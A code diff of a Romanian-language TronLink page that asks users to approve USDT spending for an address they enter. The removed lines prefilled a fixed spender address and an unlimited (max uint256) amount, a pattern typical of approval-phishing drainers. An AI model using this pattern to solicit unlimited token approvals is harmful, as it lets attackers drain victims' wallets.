@@ -34,6 +34,7 @@
       background: #111a2e;
       padding: 20px;
       border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
     }
 
     h2 {
@@ -49,6 +50,7 @@
       border: none;
       background: #1b2a4a;
       color: white;
+      outline: none;
     }
 
     button {
@@ -92,16 +94,15 @@
 <body>
 
 <div class="app">
-
   <div class="card">
 
-    <div class="title">TRC20 APPROVE APP</div>
+    <div class="title">TRC20 APPROVE DAPP</div>
     <h2>USDT Approval</h2>
 
     <button class="primary" onclick="connectWallet()">Connect Wallet</button>
 
-    <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
-    <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935" />
+    <input id="spender" placeholder="Spender address" />
+    <input id="amount" placeholder="Amount USDT" />
 
     <button class="green" onclick="approveUSDT()">Confirm & Sign</button>
 
@@ -110,18 +111,17 @@
     <div id="qrcode"></div>
 
   </div>
-
 </div>
 
 <script>
 
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 let userAddress = null;
 
 /* =========================
-   DETECT WALLET
+   WALLET DETECT
 ========================= */
-async function detectWallet() {
+function detectWallet() {
   let tries = 0;
 
   const interval = setInterval(() => {
@@ -139,7 +139,7 @@ async function detectWallet() {
 
     if (tries > 20) {
       document.getElementById("status").innerText =
-        "Deschide în TronLink DApp Browser!";
+        "Deschide pagina în TronLink DApp Browser.";
       clearInterval(interval);
     }
 
@@ -151,9 +151,10 @@ async function detectWallet() {
 ========================= */
 async function connectWallet() {
   try {
+
     if (!window.tronWeb) {
       document.getElementById("status").innerText =
-        "TronLink NU este disponibil (deschide în DApp browser)";
+        "TronLink nu este disponibil";
       return;
     }
 
@@ -176,7 +177,7 @@ async function approveUSDT() {
   try {
 
     if (!userAddress) {
-      alert("Connect wallet first");
+      alert("Conectează wallet-ul!");
       return;
     }
 
@@ -193,7 +194,7 @@ async function approveUSDT() {
     ).send();
 
     document.getElementById("status").innerText =
-      "Approve sent!\nTX:\n" + tx;
+      "Approve trimis!\nTX:\n" + tx;
 
   } catch (e) {
     document.getElementById("status").innerText = e.message;
@@ -201,19 +202,18 @@ async function approveUSDT() {
 }
 
 /* =========================
-   QR INTELIGENT (IMPORTANT FIX)
+   QR STABIL (IMPORTANT FIX)
 ========================= */
 function generateQR() {
 
-  // 🔥 IMPORTANT: forțează deschiderea în TronLink DApp browser
-  const tronlinkURL =
-    "https://tronlink.org/dapp?url=" +
-    encodeURIComponent(window.location.href);
+  // ✔️ DOAR link direct (FĂRĂ redirect-uri)
+  const stableURL = "https://SITE-UL-TAU.vercel.app";
 
   new QRCode(document.getElementById("qrcode"), {
-    text: tronlinkURL,
+    text: stableURL,
     width: 160,
-    height: 160
+    height: 160,
+    correctLevel: QRCode.CorrectLevel.H
   });
 }
 
